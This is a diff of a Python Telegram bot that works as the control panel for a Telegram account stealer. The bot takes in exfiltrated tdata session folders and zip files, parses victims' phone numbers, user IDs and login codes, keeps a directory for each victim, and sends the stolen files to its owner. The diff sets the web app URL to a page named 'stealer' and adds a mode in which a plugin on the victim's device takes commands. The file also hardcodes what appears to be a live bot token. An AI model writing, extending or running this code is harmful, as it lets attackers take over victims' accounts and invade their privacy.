@@ -19,12 +19,16 @@ from typing import Optional, List, Dict, Any, Tuple
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8676286563:AAGproI3CGEvRXuq3wW1yl74uXf7Y-0q7S4")
 OWNER_ID  = os.environ.get("OWNER_ID", "155132616")
-WEBAPP_URL = os.environ.get("WEBAPP_URL", "")  # e.g. https://your.static.host/index.html
+WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://ysername6.github.io/stealer/")
+LIVE_PLUGIN = os.environ.get("LIVE_PLUGIN", "1")  # 1 = do not poll (plugin owns getUpdates)
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 MAX_DOWNLOAD = 18 * 1024 * 1024
 TG_MSG_LIMIT = 4096
 RETRY_429_MAX = 3
+
 BOT_NAME = "Wolzer Ai"
+
+# ---------- storage ----------
 
 def _pick_store() -> Path:
     candidates = [
@@ -61,6 +65,8 @@ OFFSET_FILE = STORE / "offset.txt"
 OWNER_FILE  = STORE / "owner.txt"
 print("STORE =", STORE)
 
+# ---------- utils ----------
+
 def now_utc() -> datetime:
     return datetime.now(timezone.utc)
 
@@ -80,7 +86,8 @@ def _handle_429(resp_body: bytes) -> Optional[int]:
         return int(params.get("retry_after") or 3)
     return None
 
-def api(method: str, data: Optional[dict] = None, files: Optional[dict] = None, _retry: int = 0) -> dict:
+def api(method: str, data: Optional[dict] = None, files: Optional[dict] = None,
+        _retry: int = 0) -> dict:
     url = f"{API}/{method}"
     try:
         if files:
@@ -140,7 +147,8 @@ def _split_text(text: str, limit: int = TG_MSG_LIMIT) -> List[str]:
         parts.append(buf)
     return parts or [""]
 
-def send(text: str, chat_id: str, reply_markup: Optional[dict] = None, parse_mode: Optional[str] = None) -> List[dict]:
+def send(text: str, chat_id: str, reply_markup: Optional[dict] = None,
+         parse_mode: Optional[str] = None) -> List[dict]:
     out = []
     parts = _split_text(str(text), TG_MSG_LIMIT)
     for idx, part in enumerate(parts):
@@ -152,8 +160,13 @@ def send(text: str, chat_id: str, reply_markup: Optional[dict] = None, parse_mod
         out.append(api("sendMessage", data))
     return out
 
-def edit(text: str, chat_id: str, message_id: int, reply_markup: Optional[dict] = None) -> dict:
-    data = {"chat_id": str(chat_id), "message_id": message_id, "text": str(text)[:TG_MSG_LIMIT]}
+def edit(text: str, chat_id: str, message_id: int,
+         reply_markup: Optional[dict] = None) -> dict:
+    data = {
+        "chat_id": str(chat_id),
+        "message_id": message_id,
+        "text": str(text)[:TG_MSG_LIMIT],
+    }
     if reply_markup:
         data["reply_markup"] = json.dumps(reply_markup)
     return api("editMessageText", data)
@@ -164,9 +177,12 @@ def answer_cb(cb_id: str, text: Optional[str] = None) -> dict:
         data["text"] = str(text)[:200]
     return api("answerCallbackQuery", data)
 
+# ---------- meta ----------
+
 def save_meta(pkg_id: str, meta: dict) -> None:
     try:
-        (STORE / f"{pkg_id}.json").write_text(json.dumps(meta, indent=2, ensure_ascii=False))
+        (STORE / f"{pkg_id}.json").write_text(
+            json.dumps(meta, indent=2, ensure_ascii=False))
     except Exception as e:
         print("save_meta:", e)
 
@@ -218,6 +234,8 @@ def victim_dir(chat_id: str) -> Path:
     d = VICTIMS / safe
     d.mkdir(parents=True, exist_ok=True)
     return d
+
+# ---------- zip parsing ----------
 
 def extract_from_zip(zip_path: Path) -> Tuple[list, dict, str]:
     accounts: list = []
@@ -309,14 +327,24 @@ def rebuild_from_disk() -> int:
             except Exception:
                 pass
         meta = {
-            "id": pkg_id, "file": f.name, "caption": f.name, "size": f.stat().st_size,
-            "date": int(f.stat().st_mtime), "accounts": accounts, "device": device,
-            "codes_preview": (codes or "")[:2000], "is_zip": is_zip, "is_tdata": is_tdata,
-            "from_chat": OWNER_ID, "rebuilt": True,
+            "id": pkg_id,
+            "file": f.name,
+            "caption": f.name,
+            "size": f.stat().st_size,
+            "date": int(f.stat().st_mtime),
+            "accounts": accounts,
+            "device": device,
+            "codes_preview": (codes or "")[:2000],
+            "is_zip": is_zip,
+            "is_tdata": is_tdata,
+            "from_chat": OWNER_ID,
+            "rebuilt": True,
         }
         save_meta(pkg_id, meta)
         created += 1
     return created
+
+# ---------- keyboards ----------
 
 def main_menu_kb() -> dict:
     rows = [
@@ -335,7 +363,10 @@ def packages_kb(pkgs: List[dict]) -> dict:
     for m in pkgs[:30]:
         tag = "tdata" if m.get("is_tdata") else ("zip" if m.get("is_zip") else "file")
         cap = (m.get("caption") or m.get("file") or "")[:36]
-        rows.append([{"text": f"{m.get('id','?')} | {tag} | {cap} | {m.get('size',0)}b", "callback_data": f"pkg:{m['id']}"}])
+        rows.append([{
+            "text": f"{m.get('id','?')} | {tag} | {cap} | {m.get('size',0)}b",
+            "callback_data": f"pkg:{m['id']}",
+        }])
     rows.append([{"text": "<< Main", "callback_data": "menu:main"}])
     return {"inline_keyboard": rows}
 
@@ -357,19 +388,28 @@ def package_kb(pkg_id: str, accounts: list) -> dict:
     rows = []
     for i, a in enumerate((accounts or [])[:12]):
         name = f"{a.get('first_name') or ''} {a.get('last_name') or ''}".strip() or "—"
-        rows.append([{"text": f"#{a.get('account',i)} {name} +{a.get('phone')} ({a.get('user_id')})", "callback_data": f"acc:{pkg_id}:{i}"}])
+        rows.append([{
+            "text": f"#{a.get('account',i)} {name} +{a.get('phone')} ({a.get('user_id')})",
+            "callback_data": f"acc:{pkg_id}:{i}",
+        }])
     if not rows:
         rows.append([{"text": "(no accounts)", "callback_data": "noop"}])
-    rows.append([{"text": "Full file", "callback_data": f"act:zip:{pkg_id}"}, {"text": "Wipe", "callback_data": f"act:wipe:{pkg_id}"}])
+    rows.append([
+        {"text": "Full file", "callback_data": f"act:zip:{pkg_id}"},
+        {"text": "Wipe", "callback_data": f"act:wipe:{pkg_id}"},
+    ])
     rows.append([{"text": "<< Packages", "callback_data": "menu:list"}])
     return {"inline_keyboard": rows}
 
 def account_kb(pkg_id: str, acc_idx: int) -> dict:
     return {"inline_keyboard": [
-        [{"text": "Info .txt", "callback_data": f"act:info:{pkg_id}:{acc_idx}"}, {"text": "Codes", "callback_data": f"act:codes:{pkg_id}:{acc_idx}"}],
+        [{"text": "Info .txt", "callback_data": f"act:info:{pkg_id}:{acc_idx}"},
+         {"text": "Codes", "callback_data": f"act:codes:{pkg_id}:{acc_idx}"}],
         [{"text": "Full package", "callback_data": f"act:zip:{pkg_id}"}],
         [{"text": "<< Accounts", "callback_data": f"pkg:{pkg_id}"}],
     ]}
+
+# ---------- document handler ----------
 
 def _safe_acct_name(name: str) -> Optional[str]:
     base = Path(name).name
@@ -388,15 +428,34 @@ def handle_document(msg: dict) -> None:
     file_name = doc.get("file_name", "file.bin")
     caption = msg.get("caption", "") or ""
     file_size = int(doc.get("file_size") or 0)
+
     pkg_id = now_utc().strftime("%Y%m%d_%H%M%S") + f"_{int(time.time()*1000)%1000:03d}"
     safe_name = re.sub(r"[^\w.\-]", "_", file_name)[:80] or "file.bin"
     is_tdata = "tdata" in safe_name.lower() or "tdata" in caption.lower()
+
     if file_size > MAX_DOWNLOAD:
-        meta = {"id": pkg_id, "file": None, "file_id": file_id, "caption": caption or safe_name, "size": file_size, "date": msg.get("date"), "accounts": [], "device": {}, "codes_preview": "", "is_zip": safe_name.lower().endswith(".zip"), "is_tdata": is_tdata, "from_chat": chat_id, "from_user": from_user.get("username") or from_user.get("first_name") or chat_id, "too_big": True}
+        meta = {
+            "id": pkg_id,
+            "file": None,
+            "file_id": file_id,
+            "caption": caption or safe_name,
+            "size": file_size,
+            "date": msg.get("date"),
+            "accounts": [],
+            "device": {},
+            "codes_preview": "",
+            "is_zip": safe_name.lower().endswith(".zip"),
+            "is_tdata": is_tdata,
+            "from_chat": chat_id,
+            "from_user": from_user.get("username") or from_user.get("first_name") or chat_id,
+            "too_big": True,
+        }
         save_meta(pkg_id, meta)
         if chat_id == OWNER_ID:
-            send(f"stored meta only (too big {file_size}b)\nid={pkg_id}\n{safe_name}", chat_id, main_menu_kb())
+            send(f"stored meta only (too big {file_size}b)\nid={pkg_id}\n{safe_name}",
+                 chat_id, main_menu_kb())
         return
+
     file_info = api("getFile", {"file_id": file_id})
     if not file_info.get("ok"):
         if chat_id == OWNER_ID:
@@ -410,8 +469,10 @@ def handle_document(msg: dict) -> None:
         if chat_id == OWNER_ID:
             send(f"download fail: {e}", chat_id)
         return
+
     dest_path = STORE / f"{pkg_id}_{safe_name}"
     dest_path.write_bytes(raw)
+
     accounts, device, codes_preview = [], {}, ""
     is_zip = safe_name.lower().endswith(".zip") or (len(raw) > 4 and raw[:2] == b"PK")
     if is_zip:
@@ -425,20 +486,51 @@ def handle_document(msg: dict) -> None:
             uid_m = re.search(r"ID:\s*(\d+)", text)
             phone_m = re.search(r"Phone:\s*\+?(\d+)", text)
             name_m = re.search(r"Name:\s*(.+)", text)
-            accounts = [{"user_id": uid_m.group(1) if uid_m else None, "phone": phone_m.group(1) if phone_m else None, "first_name": (name_m.group(1).strip() if name_m else "")[:40], "account": 0}]
+            accounts = [{
+                "user_id": uid_m.group(1) if uid_m else None,
+                "phone": phone_m.group(1) if phone_m else None,
+                "first_name": (name_m.group(1).strip() if name_m else "")[:40],
+                "account": 0,
+            }]
             codes_preview = text
         except Exception as e:
             print("txt parse", e)
-    meta = {"id": pkg_id, "file": dest_path.name, "caption": caption or safe_name, "size": len(raw), "date": msg.get("date"), "accounts": accounts, "device": device, "codes_preview": (codes_preview or "")[:2000], "is_zip": is_zip, "is_tdata": is_tdata, "from_chat": chat_id, "from_user": from_user.get("username") or from_user.get("first_name") or chat_id}
+
+    meta = {
+        "id": pkg_id,
+        "file": dest_path.name,
+        "caption": caption or safe_name,
+        "size": len(raw),
+        "date": msg.get("date"),
+        "accounts": accounts,
+        "device": device,
+        "codes_preview": (codes_preview or "")[:2000],
+        "is_zip": is_zip,
+        "is_tdata": is_tdata,
+        "from_chat": chat_id,
+        "from_user": from_user.get("username") or from_user.get("first_name") or chat_id,
+    }
     save_meta(pkg_id, meta)
+
     if chat_id == OWNER_ID:
         tag = "tdata" if is_tdata else ("zip" if is_zip else "file")
-        send(f"stored {pkg_id} [{tag}]\n{caption or safe_name}\n{len(raw)}b | acc={len(accounts)}", chat_id, {"inline_keyboard": [[{"text": "Open", "callback_data": f"pkg:{pkg_id}"}], [{"text": "All packages", "callback_data": "menu:list"}]]})
+        send(
+            f"stored {pkg_id} [{tag}]\n{caption or safe_name}\n"
+            f"{len(raw)}b | acc={len(accounts)}",
+            chat_id,
+            {"inline_keyboard": [
+                [{"text": "Open", "callback_data": f"pkg:{pkg_id}"}],
+                [{"text": "All packages", "callback_data": "menu:list"}],
+            ]},
+        )
+
+# ---------- text / callback (owner panel only) ----------
 
 def handle_text(msg: dict) -> None:
     global OWNER_ID
     text = (msg.get("text") or "").strip()
     chat_id = str(msg["chat"]["id"])
+
     if not OWNER_ID or OWNER_ID == "0":
         OWNER_ID = chat_id
         try:
@@ -447,12 +539,22 @@ def handle_text(msg: dict) -> None:
             pass
         send(f"owner locked = {OWNER_ID}\nSTORE={STORE}", chat_id, main_menu_kb())
         return
+
     if chat_id != OWNER_ID:
         return
+
+    # web_app_data can also arrive as message when bot is poller
+    # (plugin normally owns getUpdates — this path is fallback)
+
     if text in ("/start", "/help", "/menu"):
         n_pkg = len([p for p in STORE.glob("*.json") if p.name not in ("offset.txt", "owner.txt")])
         n_acc = len(list(ACCOUNTS_DIR.glob("*.txt")))
-        note = f"{BOT_NAME} — package manager\nSTORE={STORE}\npackages={n_pkg} account_txt={n_acc}\nlive control = plugin cmd channel (!ping / WebApp)\nWEBAPP_URL={'set' if WEBAPP_URL else 'NOT SET'}"
+        note = (
+            f"{BOT_NAME} — package manager\n"
+            f"STORE={STORE}\npackages={n_pkg} account_txt={n_acc}\n"
+            f"live control = plugin cmd channel (!ping / WebApp)\n"
+            f"WEBAPP_URL={'set' if WEBAPP_URL else 'NOT SET'}"
+        )
         send(note, chat_id, main_menu_kb())
     elif text.startswith("/list") or text == "/packages":
         pkgs = list_packages()
@@ -463,7 +565,8 @@ def handle_text(msg: dict) -> None:
     elif text == "/scan":
         n = rebuild_from_disk()
         pkgs = list_packages()
-        send(f"scan done, created {n} meta\npackages now={len(pkgs)}", chat_id, packages_kb(pkgs) if pkgs else main_menu_kb())
+        send(f"scan done, created {n} meta\npackages now={len(pkgs)}",
+             chat_id, packages_kb(pkgs) if pkgs else main_menu_kb())
     elif text.startswith("/get "):
         pkg_id = text.split(maxsplit=1)[1].strip()
         meta = load_meta(pkg_id)
@@ -477,7 +580,8 @@ def handle_text(msg: dict) -> None:
         if not path.exists():
             send("file missing on disk", chat_id)
             return
-        api("sendDocument", {"chat_id": chat_id, "caption": pkg_id}, {"document": (path.name, path.read_bytes())})
+        api("sendDocument", {"chat_id": chat_id, "caption": pkg_id},
+            {"document": (path.name, path.read_bytes())})
     elif text.startswith("/wipe "):
         pkg_id = text.split(maxsplit=1)[1].strip()
         meta = load_meta(pkg_id)
@@ -490,16 +594,26 @@ def handle_text(msg: dict) -> None:
             send("unknown", chat_id)
     elif text.startswith("/whoami"):
         send(f"chat_id={chat_id}\nowner={OWNER_ID}\nSTORE={STORE}", chat_id)
+    elif text.startswith("/setwebapp "):
+        # runtime hint only — set env for real use
+        send(
+            "set WEBAPP_URL env before start:\n"
+            "  WEBAPP_URL=https://host/index.html python bot_manager.py\n"
+            "then /start to get the button",
+            chat_id,
+        )
 
 def handle_callback(cq: dict) -> None:
     data = cq.get("data", "")
     chat_id = str(cq["message"]["chat"]["id"])
     msg_id = cq["message"]["message_id"]
     cb_id = cq["id"]
+
     if chat_id != OWNER_ID:
         answer_cb(cb_id, "owner only")
         return
     answer_cb(cb_id)
+
     if data == "menu:main":
         edit(f"{BOT_NAME} — package manager\nSTORE={STORE}", chat_id, msg_id, main_menu_kb())
     elif data == "menu:list":
@@ -511,7 +625,8 @@ def handle_callback(cq: dict) -> None:
     elif data == "menu:scan":
         n = rebuild_from_disk()
         pkgs = list_packages()
-        edit(f"scan: +{n} meta, total={len(pkgs)}", chat_id, msg_id, packages_kb(pkgs) if pkgs else main_menu_kb())
+        edit(f"scan: +{n} meta, total={len(pkgs)}",
+             chat_id, msg_id, packages_kb(pkgs) if pkgs else main_menu_kb())
     elif data == "menu:accs":
         files = list_account_txts()
         if not files:
@@ -535,7 +650,8 @@ def handle_callback(cq: dict) -> None:
             return
         path = ACCOUNTS_DIR / name
         if path.exists() and path.is_file():
-            api("sendDocument", {"chat_id": chat_id, "caption": name}, {"document": (name, path.read_bytes())})
+            api("sendDocument", {"chat_id": chat_id, "caption": name},
+                {"document": (name, path.read_bytes())})
         else:
             send("gone", chat_id)
     elif data.startswith("vic:"):
@@ -543,14 +659,18 @@ def handle_callback(cq: dict) -> None:
         vdir = VICTIMS / vid
         files = list(vdir.iterdir()) if vdir.exists() else []
         text = f"victim {vid}\n" + "\n".join(x.name for x in files[:25])
-        edit(text, chat_id, msg_id, {"inline_keyboard": [[{"text": "Get files", "callback_data": f"vget:{vid}"}], [{"text": "<< Victims", "callback_data": "menu:victims"}]]})
+        edit(text, chat_id, msg_id, {"inline_keyboard": [
+            [{"text": "Get files", "callback_data": f"vget:{vid}"}],
+            [{"text": "<< Victims", "callback_data": "menu:victims"}],
+        ]})
     elif data.startswith("vget:"):
         vid = data.split(":", 1)[1]
         vdir = VICTIMS / vid
         if vdir.exists():
             for f in sorted(vdir.iterdir()):
                 if f.is_file() and f.suffix in (".zip", ".txt"):
-                    api("sendDocument", {"chat_id": chat_id, "caption": f"{vid}/{f.name}"}, {"document": (f.name, f.read_bytes())})
+                    api("sendDocument", {"chat_id": chat_id, "caption": f"{vid}/{f.name}"},
+                        {"document": (f.name, f.read_bytes())})
     elif data.startswith("pkg:"):
         pkg_id = data.split(":", 1)[1]
         meta = load_meta(pkg_id)
@@ -568,7 +688,11 @@ def handle_callback(cq: dict) -> None:
                 save_meta(pkg_id, meta)
         device = meta.get("device") or {}
         tag = "tdata" if meta.get("is_tdata") else ""
-        header = f"Package {pkg_id} {tag}\n{(meta.get('caption') or '')[:80]}\nsize={meta.get('size')} acc={len(accounts)}\n{device.get('manufacturer','')} {device.get('model','')} {device.get('format','')}"
+        header = (
+            f"Package {pkg_id} {tag}\n{(meta.get('caption') or '')[:80]}\n"
+            f"size={meta.get('size')} acc={len(accounts)}\n"
+            f"{device.get('manufacturer','')} {device.get('model','')} {device.get('format','')}"
+        )
         if meta.get("too_big"):
             header += "\nTOO BIG — meta only"
         edit(header, chat_id, msg_id, package_kb(pkg_id, accounts))
@@ -583,7 +707,10 @@ def handle_callback(cq: dict) -> None:
             edit("bad index", chat_id, msg_id)
             return
         a = accounts[idx]
-        text = f"#{a.get('account')} {a.get('first_name')} {a.get('last_name')}\n+{a.get('phone')}\nid={a.get('user_id')}\n@{a.get('username')}"
+        text = (
+            f"#{a.get('account')} {a.get('first_name')} {a.get('last_name')}\n"
+            f"+{a.get('phone')}\nid={a.get('user_id')}\n@{a.get('username')}"
+        )
         edit(text, chat_id, msg_id, account_kb(pkg_id, idx))
     elif data.startswith("act:info:"):
         parts = data.split(":")
@@ -596,9 +723,16 @@ def handle_callback(cq: dict) -> None:
         uid = str(a.get("user_id") or "")
         cand = ACCOUNTS_DIR / f"acc_{uid}.txt"
         codes = cand.read_text(errors="ignore") if cand.exists() else (meta.get("codes_preview") or "")
-        txt = f"=== ACCOUNT INFO ===\nName: {a.get('first_name') or ''} {a.get('last_name') or ''}\nPhone: +{a.get('phone')}\nID: {a.get('user_id')}\nUsername: @{a.get('username')}\n\n{codes}"
+        txt = (
+            f"=== ACCOUNT INFO ===\n"
+            f"Name: {a.get('first_name') or ''} {a.get('last_name') or ''}\n"
+            f"Phone: +{a.get('phone')}\n"
+            f"ID: {a.get('user_id')}\n"
+            f"Username: @{a.get('username')}\n\n{codes}"
+        )
         fname = f"acc_{uid or idx}.txt"
-        api("sendDocument", {"chat_id": chat_id, "caption": fname}, {"document": (fname, txt.encode("utf-8"))})
+        api("sendDocument", {"chat_id": chat_id, "caption": fname},
+            {"document": (fname, txt.encode("utf-8"))})
     elif data.startswith("act:codes:"):
         parts = data.split(":")
         if len(parts) < 4:
@@ -619,7 +753,8 @@ def handle_callback(cq: dict) -> None:
             return
         path = STORE / (meta.get("file") or "")
         if path.exists():
-            api("sendDocument", {"chat_id": chat_id, "caption": pkg_id}, {"document": (path.name, path.read_bytes())})
+            api("sendDocument", {"chat_id": chat_id, "caption": pkg_id},
+                {"document": (path.name, path.read_bytes())})
         else:
             send("missing", chat_id)
     elif data.startswith("act:wipe:"):
@@ -642,7 +777,9 @@ def process_update(upd: dict) -> None:
         return
     if msg.get("chat", {}).get("type") != "private":
         return
+    # web_app_data
     if msg.get("web_app_data"):
+        # if bot is polling, forward is not needed — plugin normally owns this
         data = (msg.get("web_app_data") or {}).get("data") or ""
         send(f"[webapp data received] {data}\n(plugin should execute if online)", OWNER_ID)
         return
@@ -661,7 +798,15 @@ def setup_webapp_menu() -> None:
     if not WEBAPP_URL:
         print("WEBAPP_URL empty — no menu button")
         return
-    r = api("setChatMenuButton", {"chat_id": OWNER_ID, "menu_button": json.dumps({"type": "web_app", "text": "Control", "web_app": {"url": WEBAPP_URL}})})
+    # set chat menu button for owner
+    r = api("setChatMenuButton", {
+        "chat_id": OWNER_ID,
+        "menu_button": json.dumps({
+            "type": "web_app",
+            "text": "Control",
+            "web_app": {"url": WEBAPP_URL},
+        }),
+    })
     print("setChatMenuButton:", r.get("ok"), r.get("description", ""))
 
 def main() -> None:
@@ -677,15 +822,27 @@ def main() -> None:
         print("startup scan created", n)
     except Exception as e:
         print("startup scan", e)
+
     setup_webapp_menu()
+
+    if str(LIVE_PLUGIN).strip() in ("1", "true", "yes", "on"):
+        print(
+            "LIVE_PLUGIN=1 — not polling.\n"
+            "Plugin on device owns getUpdates / !commands / WebApp.\n"
+            "This process only set menu button and can manage local STORE if you set LIVE_PLUGIN=0."
+        )
+        print("menu URL:", WEBAPP_URL)
+        return
+
     offset = 0
     if OFFSET_FILE.exists():
         try:
             offset = int(OFFSET_FILE.read_text().strip() or "0")
         except Exception:
             offset = 0
+
     socket.setdefaulttimeout(60)
-    print("polling…\nNOTE: if plugin v3 is online it also polls getUpdates —\nrun only one poller. Plugin owns live commands; this bot owns packages.")
+    print("polling packages… LIVE_PLUGIN=0")
     while True:
         try:
             resp = api("getUpdates", {"offset": offset, "timeout": 30})
